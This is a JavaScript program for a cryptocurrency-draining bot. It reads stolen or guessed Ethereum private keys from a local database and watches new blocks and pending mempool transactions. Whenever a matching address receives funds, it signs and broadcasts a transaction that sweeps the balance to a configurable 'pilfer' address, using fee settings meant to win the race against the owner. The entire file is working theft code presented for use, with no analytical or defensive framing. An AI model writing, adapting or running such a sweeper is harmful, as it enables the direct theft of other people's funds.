const sqlite3 = require("sqlite3");
const sqlite = require("sqlite");
const Web3 = require("web3");
const { FeeMarketEIP1559Transaction } = require("@ethereumjs/tx");

const { BN } = Web3.utils;

const { log } = require("./utils");
const EtherscanBroadcaster = require("./etherscan-broadcaster");
const Web3Broadcaster = require("./web3-broadcaster");

/** BEGIN CONFIGURATION * */

// Path to an sqlite3 database of key pairs.
const SQLITE_DATABASE_PATH = "./keys.db";

// If you have Etherscan or Infura api keys, enter them here.
// They will be used to relay transactions (optional).
const ETHERSCAN_API_KEY = "";
const INFURA_API_KEY = "";

// The address to send pilfered ethereum to.
const PILFER_ADDRESS = "YOUR_ADDRESS"; // <-- Make sure you set this!!

// The connection string to a web3 websocket service.
// Websockets must be used to support subscribing to blockchain events.
const WEB3_WEBSOCKET_ADDRESS = "ws://127.0.0.1:8546";

// Gas parameters:
//
// The gas price of a transaction will be calculated based on these settings.
// The gas price is determined such that the total gas cost equals:
//    `FEE_RATIO_NUMERATOR/FEE_RATIO_DENOMINATOR` * wallet value
// If the gas price is calculated to be less than `MIN_GAS_PRICE`, then `MIN_GAS_PRICE` is used.
// If the gas price is calculated to be more than `MAX_GAS_PRICE`, then `MAX_GAS_PRICE` is used.
// If there isn't enough ethereum to cover the MIN_GAS_PRICE, no pilfer will be attempted.
const GAS_LIMIT = new BN(21000);
const MAX_GAS_PRICE = new BN(2000000000000);
const MIN_GAS_PRICE = new BN(80000000000);
const FEE_RATIO_NUMERATOR = new BN(4);
const FEE_RATIO_DENOMINATOR = new BN(5);

/** END CONFIGURATION * */

let db;
let waitingForBlock = [];

const web3 = new Web3(WEB3_WEBSOCKET_ADDRESS);
const broadcasters = [];
if (ETHERSCAN_API_KEY) {
  broadcasters.push(new EtherscanBroadcaster(ETHERSCAN_API_KEY));
}
if (INFURA_API_KEY) {
  broadcasters.push(
    new Web3Broadcaster(
      "Infura",
      `https://mainnet.infura.io/v3/${INFURA_API_KEY}`
    )
  );
}

// Formats the transaction into a somewhat human readable form.
function niceTransactionJson(transaction) {
  return JSON.stringify(
    {
      ...transaction,
      gasLimit: transaction.gasLimit.toString(10),
      maxFeePerGas: `${Web3.utils.fromWei(
        transaction.maxFeePerGas,
        "gwei"
      )} gwei`,
      maxPriorityFeePerGas: `${Web3.utils.fromWei(
        transaction.maxPriorityFeePerGas,
        "gwei"
      )} gwei`,
      value: `${Web3.utils.fromWei(transaction.value, "ether")} eth`,
    },
    null,
    2
  );
}

// Sends a transaction to the local node as well as any configured broadcasters.
// Also prints links to etherscan to view the transaction and to submit it manually.
function sendTransaction(signedTransaction) {
  log(`Attempting pilfer:`);
  console.log(`link: https://etherscan.io/tx/${signedTransaction.hash}`);
  const transactionHex = `0x${signedTransaction.raw.toString("hex")}`;
  console.log(`manual: https://etherscan.io/pushTx?hex=${transactionHex}`);
  console.log(niceTransactionJson(signedTransaction.params));

  const start = new Date();
  return Promise.all([
    web3.eth
      .sendSignedTransaction(transactionHex)
      .then(({ transactionHash }) => {
        const end = new Date();
        const ethValue = Web3.utils.fromWei(
          signedTransaction.params.value,
          "ether"
        );
        log(
          `Pilfer of ${ethValue}eth successful!` +
            `\ntx:${transactionHash} (${end - start}ms).`
        );
      }),
    ...broadcasters.map((b) => b.sendSignedTransaction(transactionHex)),
  ]).catch((err) => console.error(err.message));
}

// Creates a signed transaction ready to be sent
async function buildTransaction(address, key, value) {
  const gasPrice = BN.max(
    MIN_GAS_PRICE,
    BN.min(
      MAX_GAS_PRICE,
      value.mul(FEE_RATIO_NUMERATOR).div(FEE_RATIO_DENOMINATOR).div(GAS_LIMIT)
    )
  );
  const pilferValue = value.sub(gasPrice.mul(GAS_LIMIT));
  if (!pilferValue.isNeg()) {
    const params = {
      to: PILFER_ADDRESS,
      gasLimit: GAS_LIMIT,
      maxFeePerGas: gasPrice,
      maxPriorityFeePerGas: gasPrice,
      value: pilferValue,
      nonce: await web3.eth.getTransactionCount(address),
    };
    const signed = FeeMarketEIP1559Transaction.fromTxData(params).sign(
      Buffer.from(key.replace("0x", ""), "hex")
    );
    const hash = `0x${signed.hash().toString("hex")}`;
    const raw = signed.serialize();
    return { params, hash, raw };
  }
  log(`Not enough eth to cover fees, ignoring transaction to ${address}`);
  return null;
}

// Process candidate address discovered via a block transaction.
// Since this transaction is already in a block, we send the pilfer transaction immediately.
async function examineBlockCandidate(address, key) {
  const value = new BN(await web3.eth.getBalance(address));
  const ethValue = Web3.utils.fromWei(value, "ether");
  log(`Found block candidate ${address}, value: ${ethValue} eth`);
  const signedTransaction = await buildTransaction(address, key, value);
  if (signedTransaction === null) {
    return null;
  }
  return sendTransaction(signedTransaction);
}

// Process candidate discovered via a pending mempool transaction.
// This will create and sign a transaction and adds it to the waiting list.
// The pilfer transaction will be sent as soon as the deposit transaction is included in a block.
async function examineMempoolCandidate(address, key, transaction) {
  const value = new BN(await web3.eth.getBalance(address)).add(
    new BN(transaction.value)
  );
  const ethValue = Web3.utils.fromWei(value, "ether");
  log(`Found mempool candidate ${address}, value: ${ethValue} eth`);
  const signedTransaction = await buildTransaction(address, key, value);
  if (signedTransaction === null) {
    return;
  }
  waitingForBlock.push({
    triggerHash: transaction.hash, // The transaction hash to watch for before transmitting the withdrawal
    date: new Date(), // The date the pending transaction was discovered
    ...signedTransaction,
  });
}

// Triggered on each new block.
// Examines the transactions in the block for any that match waiting pilfer transactions.
// Also examines other transactions in the block for potential plundering.
async function newBlock({ number, timestamp }) {
  const start = new Date();
  const blockTime = new Date(timestamp * 1000);

  log(`Received block #${number} at T+${(start - blockTime) / 1000}s`);

  let { transactions } = await web3.eth.getBlock(number, true);

  // exclude contract deployments
  transactions = transactions.filter((t) => typeof t.to === "string");

  const addresses = transactions
    .filter((t) => !waitingForBlock.map((w) => w.triggerHash).includes(t.hash))
    .map((t) => t.to.toLowerCase());

  const sendWaitingTransactions = waitingForBlock
    .filter((t) => transactions.map((tx) => tx.hash).includes(t.triggerHash))
    .map((t) =>
      sendTransaction(t).then(() => {
        const index = waitingForBlock.indexOf(t);
        waitingForBlock.splice(index, 1);
      })
    );

  // Remove waiting transactions older than 10 minutes
  waitingForBlock = waitingForBlock.filter((w) => w.date > Date.now() - 600);

  const examineBlockTransactions = db.each(
    `SELECT address, key FROM pairs WHERE address IN (${addresses
      .map(() => "?")
      .join(",")})`,
    addresses,
    (_, { address, key }) => examineBlockCandidate(address, key)
  );

  try {
    await Promise.all([sendWaitingTransactions, examineBlockTransactions]);
  } catch (err) {
    console.error(err.message);
  }

  const end = new Date();
  log(
    `Processed block #${number} in ${end - start}ms (w4b: ${
      waitingForBlock.length
    })`
  );
}

// Triggered for each newly recieved pending transaction.
// Checks if we know the private key for receiving address.
// If we do, pass to `examineMempoolCandidate` for further scrutiny.
async function newPendingTransaction(hash) {
  const transaction = await web3.eth.getTransaction(hash);
  if (typeof transaction?.to !== "string") {
    return;
  }
  const address = transaction.to.toLowerCase();
  try {
    await db.each(
      `SELECT key FROM pairs WHERE address = ?`,
      [address],
      (_, { key }) => examineMempoolCandidate(address, key, transaction)
    );
  } catch (err) {
    console.error(err.message);
  }
}

async function main() {
  // Establish sqlite db connection
  db = await sqlite.open({
    filename: SQLITE_DATABASE_PATH,
    driver: sqlite3.Database,
  });

  // Subscribe to new block events
  const blockSubscription = web3.eth.subscribe("newBlockHeaders");
  blockSubscription.on("connected", () => log("Listening for new blocks."));
  blockSubscription.on("error", console.error);
  blockSubscription.on("data", newBlock);

  // Subscribe to new pending transaction events
  const pendingTransactionSubscription = web3.eth.subscribe(
    "pendingTransactions"
  );
  pendingTransactionSubscription.on("connected", () =>
    log("Listening for pending transactions.")
  );
  pendingTransactionSubscription.on("error", console.error);
  pendingTransactionSubscription.on("data", newPendingTransaction);

  // Clean up handles on exit
  let shuttingDown = false;
  [
    `exit`,
    `SIGINT`,
    `SIGUSR1`,
    `SIGUSR2`,
    `uncaughtException`,
    `SIGTERM`,
  ].forEach((eventType) => {
    process.on(eventType, async () => {
      if (shuttingDown) return;
      shuttingDown = true;
      console.log("\nShutting down...");
      await db.close();
      web3.currentProvider.connection.close();
      broadcasters.forEach((b) => b.close());
      process.exit(0);
    });
  });
}

main();
